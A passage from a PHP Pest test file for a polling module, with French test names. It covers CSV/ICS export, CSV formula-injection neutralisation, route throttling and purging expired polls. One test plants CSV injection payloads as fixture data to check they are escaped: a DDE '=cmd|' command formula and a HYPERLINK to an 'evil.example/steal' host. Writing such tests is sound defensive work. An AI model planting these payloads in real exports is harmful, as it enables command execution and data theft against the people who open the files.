    expect(\Modules\Core\Services\ModuleChecker::isAvailable('ShortUrl'))->toBeTrue();

    $poll = decidoCreatePoll();
    $this->assertNull($poll->getShortUrlString());
});

// ── Export CSV/ICS (service, tests unitaires directs) ────────────────────────

test('PollExportService::exportIcs lève une exception si le sondage n’est pas fermé', function (): void {
    $poll = decidoCreatePoll(['status' => 'open']);

    $this->expectException(RuntimeException::class);
    (new PollExportService)->exportIcs($poll);
});

test('export CSV neutralise l’injection de formule (voter_pseudonym contrôlé par un votant anonyme)', function (): void {
    // Round 5 adversarial (skill /100) : sans neutralisation, une valeur commençant par =/+/-/@
    // est interprétée comme une formule active par Excel/Google Sheets à l'ouverture par
    // l'organisateur (OWASP CSV Injection).
    $poll = decidoCreatePoll();
    $option = $poll->options()->create(['label' => '=cmd|"/c calc"!A1', 'sort_order' => 0]);
    $option->votes()->create([
        'poll_id' => $poll->id,
        'voter_token' => Str::uuid()->toString(),
        'voter_pseudonym' => '=HYPERLINK("http://evil.example/steal","clique ici")',
        'value' => 'selected',
    ]);

    $csv = (new PollExportService)->exportCsv($poll->fresh(['options.votes']));

    expect($csv)->toContain("'=HYPERLINK");
    expect($csv)->toContain("'=cmd|");
    expect($csv)->not->toContain('"=HYPERLINK');
});

test('decido.store et decido.vote.store portent un middleware throttle (anti-abus)', function (): void {
    $storeMiddleware = collect(Route::getRoutes()->getByName('decido.store')->gatherMiddleware());
    $voteMiddleware = collect(Route::getRoutes()->getByName('decido.vote.store')->gatherMiddleware());

    expect($storeMiddleware->contains(fn ($m) => str_starts_with($m, 'throttle:')))->toBeTrue();
    expect($voteMiddleware->contains(fn ($m) => str_starts_with($m, 'throttle:')))->toBeTrue();
});

test('decido:purge-expired supprime les sondages clôturés expirés et épargne les autres', function (): void {
    $expired = decidoCreatePoll(['status' => 'closed']);
    $expired->expires_at = now()->subDay();
    $expired->save();

    $notYetExpired = decidoCreatePoll(['status' => 'closed']);
    $notYetExpired->expires_at = now()->addMonths(3);
    $notYetExpired->save();

    $stillOpen = decidoCreatePoll(['status' => 'open']);

    $this->artisan('decido:purge-expired')->assertExitCode(0);

    expect(Poll::find($expired->id))->toBeNull();
    expect(Poll::find($notYetExpired->id))->not->toBeNull();
    expect(Poll::find($stillOpen->id))->not->toBeNull();
});
